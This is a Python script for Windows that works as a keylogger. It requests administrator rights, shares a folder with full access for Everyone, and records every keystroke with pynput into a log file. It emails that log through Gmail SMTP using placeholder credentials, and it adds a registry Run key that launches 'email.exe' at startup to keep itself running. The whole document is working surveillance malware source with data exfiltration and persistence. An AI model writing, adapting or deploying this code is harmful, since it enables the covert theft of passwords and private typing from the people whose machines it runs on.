import platform
import smtplib
import os
import sys
import ctypes
import subprocess
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

def run_as_admin():
    try:
        if not is_admin():
            print("Restarting script with administrator privileges...")
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            sys.exit()
    except Exception as e:
        print(f"Error while attempting to run as admin: {e}")
        sys.exit(1)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"Error checking admin privileges: {e}")
        return False

# Constants
MARKER_FOLDER = r"C:\myshare"

if __name__ == "__main__":
    # Restart the script with administrator privileges if needed
    run_as_admin()

def check_windows_version():
    try:
        version = platform.version()
        release = platform.release()
        if release != "10":
            print("This script can only run on Windows 10.")
            sys.exit()
    except Exception as e:
        print(f"Error checking Windows version: {e}")
        sys.exit(1)

def check_marker_folder():
    try:
        marker_file = os.path.join(MARKER_FOLDER, "email.exe")
        if os.path.exists(MARKER_FOLDER) and os.path.exists(marker_file):
            print(f"Marker folder and {marker_file} found. Exiting the program.")
            sys.exit()
    except Exception as e:
        print(f"Error checking marker folder: {e}")
        sys.exit(1)

def create_shared_folder(folder_path, share_name):
    try:
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
            print(f"Folder created: {folder_path}")
        else:
            print(f"Folder already exists: {folder_path}")

        share_command = f'net share {share_name}="{folder_path}" /GRANT:Everyone,FULL'
        subprocess.run(share_command, shell=True, check=True)
        print(f"Folder shared successfully as '{share_name}' with full access for Everyone.")
    except subprocess.CalledProcessError as e:
        print(f"Error sharing folder: {e}")
    except Exception as e:
        print(f"An error occurred while creating the shared folder: {e}")

folder_path = r"C:\myshare"
share_name = "myshare"

try:
    create_shared_folder(folder_path, share_name)
except Exception as e:
    print(f"Error during folder creation or sharing: {e}")

sender_email = "your_email@gmail.com"
receiver_email = "your_email@gmail.com"
password = "your_app_password"

try:
    msg = MIMEMultipart()
    msg['Subject'] = 'Here is your text file!'
    msg['From'] = sender_email
    msg['To'] = receiver_email

    msg.attach(MIMEText("Attached is the text.txt file you wanted."))

    filename = "C:\\myshare\\logfile.txt"
    with open(filename, "rb") as f:
        file_part = MIMEApplication(f.read(), Name=filename)
        file_part['Content-Disposition'] = f'attachment; filename="{filename}"'
        msg.attach(file_part)

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, password)
        server.send_message(msg)

    print("Email sent!")
except FileNotFoundError as e:
    print(f"Error: File not found - {e}")
except smtplib.SMTPException as e:
    print(f"Error sending email: {e}")
except Exception as e:
    print(f"An unexpected error occurred while sending email: {e}")

log_file_path = r"C:\myshare\logfile.txt"

try:
    os.makedirs(os.path.dirname(log_file_path), exist_ok=True)
except Exception as e:
    print(f"Error ensuring log file directory exists: {e}")

try:
    command = r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Program1" /t REG_SZ /d "C:\myshare\email.exe --startup" /f'
    subprocess.run(command, shell=True, check=True)
    print("Registry key added successfully.")
except subprocess.CalledProcessError as e:
    print(f"Error adding registry key: {e}")
except Exception as e:
    print(f"An unexpected error occurred while adding registry key: {e}")

def on_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"[{key.name}]")
    except Exception as e:
        print(f"Error writing keystroke to log file: {e}")

try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except Exception as e:
    print(f"Error starting keyboard listener: {e}")

try:
    check_windows_version()
except Exception as e:
    print(f"Error checking Windows version: {e}")

try:
    source_file = "email.exe"
    destination_path = r"C:\myshare"

    if os.path.exists(source_file):
        command = f'copy "{source_file}" "{destination_path}"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Successfully copied '{source_file}' to '{destination_path}'.")
        else:
            print(f"Failed to copy '{source_file}'. Error: {result.stderr}")
    else:
        print(f"The file '{source_file}' does not exist. Cannot proceed with the copy operation.")
except Exception as e:
    print(f"Error during file copy operation: {e}")